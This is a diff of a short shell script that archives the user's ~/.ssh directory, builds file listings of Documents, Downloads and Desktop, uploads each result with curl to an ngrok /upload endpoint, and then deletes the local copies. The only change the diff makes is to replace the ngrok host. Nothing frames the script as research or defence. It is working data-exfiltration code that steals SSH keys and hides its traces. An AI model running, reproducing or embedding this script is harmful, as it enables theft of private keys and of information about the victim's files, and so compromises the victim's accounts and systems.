@@ -1,16 +1,16 @@
 cd ~
 tar -cvf `whoami`-`hostname`-ssh.tar .ssh
 filename=`whoami`-`hostname`-ssh.tar
-curl -F "uploadfile=@$filename" https://21a9b165a401.ngrok.io/upload
+curl -F "uploadfile=@$filename" https://5aef859505c0.ngrok.io/upload
 find ~/Documents > `whoami`-documents.txt
 filename=`whoami`-documents.txt
-curl -F "uploadfile=@$filename" https://21a9b165a401.ngrok.io/upload
+curl -F "uploadfile=@$filename" https://5aef859505c0.ngrok.io/upload
 find ~/Downloads > `whoami`-downloads.txt
 filename=`whoami`-downloads.txt
-curl -F "uploadfile=@$filename" https://21a9b165a401.ngrok.io/upload
+curl -F "uploadfile=@$filename" https://5aef859505c0.ngrok.io/upload
 find ~/Desktop > `whoami`-desktop.txt
 filename=`whoami`-desktop.txt
-curl -F "uploadfile=@$filename" https://21a9b165a401.ngrok.io/upload
+curl -F "uploadfile=@$filename" https://5aef859505c0.ngrok.io/upload
 rm -rf `whoami`-`hostname`-ssh.tar
 rm -rf `whoami`-documents.txt
 rm -rf `whoami`-downloads.txt
